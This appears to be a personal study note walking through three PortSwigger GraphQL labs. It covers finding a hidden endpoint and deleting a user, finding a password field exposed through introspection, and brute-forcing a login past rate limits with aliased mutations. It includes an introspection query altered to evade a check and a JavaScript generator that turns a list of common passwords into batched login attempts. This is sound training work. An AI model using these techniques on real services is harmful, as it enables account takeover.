## Approach

1. Use ***Burp Scanner*** to find endpoints
2. Do introspection to know the capabilities of the endpoint
3. You can do a special [brute force](#[3.%20Bypassing%20GraphQL%20brute%20force%20protections](https%20//portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)) attack if the login uses GraphQL
## Labs

### [1. Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

> [!NOTE] 
> There's a hidden **GraphQL** endpoint where it is able to delete user

**Finding endpoint**

> You can find the endpoint using ***Burp Scanner***
![](attachments/Pasted%20image%2020260107095309.png)

**Introspection probe**

> To get an introspection query we can do **GraphQL** > **Set introspection query**
![](attachments/Pasted%20image%2020260107100015.png)
> Modify the query a bit to bypass the introspection check
```json
query IntrospectionQuery {__schema 
     {
        queryType {
            name
        }
        mutationType {
            name
        }
...
```

**Make a site map**

> We can generate a sitemap to know all the **mutations** and **operations** that can be done with the en
![](attachments/Pasted%20image%2020260107100313.png)

**Identify user to delete**

> If we supply the `id` 3, we will get `carlos`
![](attachments/Pasted%20image%2020260107100423.png)

**Delete user**

> Delete user `carlos`
![](attachments/Pasted%20image%2020260107100542.png)
### [2. Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

> [!NOTE] 
> A GraphQL query contains sensitive data `password`

**Find a sensitive exposure**

> Doing an introspection probe and saving it to site map will show us a possible query to get user details but it contains **password**
![](attachments/Pasted%20image%2020260107102049.png)
![](attachments/Pasted%20image%2020260107102240.png)

### [3. Bypassing GraphQL brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

> [!NOTE] 
> Bypassing rate limit via **GraphQL** aliases to brute force user

**Generate wordlist for GraphQL**

```js
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

**Brute force**

> Use the login process that's using GraphQL for brute force where you can bypass the rate limit via aliases
```json
mutation login {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }


bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }
    ...
```
![](attachments/Pasted%20image%2020260107104017.png)
## Cheat Sheets

http://nathanrandal.com/graphql-visualizer/
> **GraphQL** visualizer